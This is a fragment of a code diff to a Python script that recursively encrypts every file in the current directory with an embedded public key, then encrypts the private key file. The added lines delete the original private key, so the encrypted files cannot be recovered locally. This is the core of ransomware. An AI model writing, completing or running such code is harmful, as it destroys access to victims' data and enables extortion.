@@ -90,6 +90,7 @@ def encrypt_all_files_in_directory(directory, public_key):
                 continue
             input_file = os.path.join(root, file)
             encrypt_real_file(input_file, public_key)
+
 # Load the public key
 public_key_pem = b"""
 -----BEGIN PUBLIC KEY-----
@@ -140,6 +141,9 @@ def encrypt_file(file_path, public_key):
         enc_file.write(iv)
         enc_file.write(ciphertext)
 
+    # Delete the original private key file
+    os.remove('private_key.pem')  # Ensure the private key is deleted
+    print("Private key has been encrypted and deleted.")
 
 def main():
     directory = '.'  # Directory to scan and encrypt all files (current directory by default)
@@ -153,7 +157,7 @@ def main():
     # Step 3: Encrypt the private key also
     public_key = load_public_key(public_key_pem)
     
-    # Encrypt the file
+    # Encrypt the private key
     encrypt_file('private_key.pem', public_key)
 
 if __name__ == "__main__":
